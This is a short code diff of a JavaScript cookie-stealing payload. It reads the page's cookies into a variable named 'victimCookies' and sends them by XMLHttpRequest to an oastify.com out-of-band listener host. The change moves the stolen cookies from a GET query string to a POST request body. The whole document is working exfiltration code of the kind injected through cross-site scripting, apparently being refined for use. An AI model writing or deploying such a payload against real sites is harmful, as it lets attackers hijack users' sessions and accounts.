@@ -1,6 +1,7 @@
 var victimCookies=document.cookie
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://rkfxajknro2l1l7f5k3ib13wwn2eq6ev.oastify.com?cookies=" + victimCookies, true);
+xhr.open("POST", "https://rkfxajknro2l1l7f5k3ib13wwn2eq6ev.oastify.com", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 xhr.onreadystatechange = function() {
   if (xhr.readyState === 4 && xhr.status === 200) {
@@ -13,4 +14,5 @@ xhr.onreadystatechange = function() {
   }
 };
 
-xhr.send();
+var requestBody = "cookies=" + victimCookies;
+xhr.send(requestBody);
